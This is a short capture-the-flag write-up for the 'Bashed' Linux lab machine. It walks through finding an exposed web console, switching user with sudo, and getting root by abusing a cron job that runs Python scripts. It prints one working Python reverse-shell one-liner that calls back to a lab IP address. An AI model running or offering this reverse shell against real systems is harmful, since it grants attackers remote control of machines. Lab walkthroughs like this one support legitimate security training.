+++
title = 'Bashed'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap shows port 80 open. After some enumeration and fuzzing I found a `/dev` directory.

![Bashed (Easy Linux).png](Bashed%20%28Easy%20Linux%29.png)

Clicking phpbash opens up a console.

![Bashed (Easy Linux)-1.png](Bashed%20%28Easy%20Linux%29-1.png)

From there we can run as the `scriptmanager` user with `sudo -u scriptmanager`.

Bash reverse shells weren't landing, but python3 is on the box, so a python3 reverse shell instead:

```python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.16.196",9000)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

![Bashed (Easy Linux)-2.png](Bashed%20%28Easy%20Linux%29-2.png)

Now scriptmanager, and in the root directory there's a `scripts` folder.

In `/scripts` there's a `test.py` owned by scriptmanager and a `test.txt` owned by root - the python file writes the text file. Running `python3 test.py` fails because test.txt is owned by root and we can't write it.

That suggested a cron job somewhere. I couldn't find it directly, but looking at test.txt it had changed based on what I'd put in the python code:

![Bashed (Easy Linux)-3.png](Bashed%20%28Easy%20Linux%29-3.png)

So let's put reverse shell code in the file instead.

And we got it.

![Bashed (Easy Linux)-5.png](Bashed%20%28Easy%20Linux%29-5.png)

![Bashed (Easy Linux)-4.png](Bashed%20%28Easy%20Linux%29-4.png)

![Bashed (Easy Linux)-6.png](Bashed%20%28Easy%20Linux%29-6.png)

There was a crontab set up to run all python files in `/scripts` - root shell.
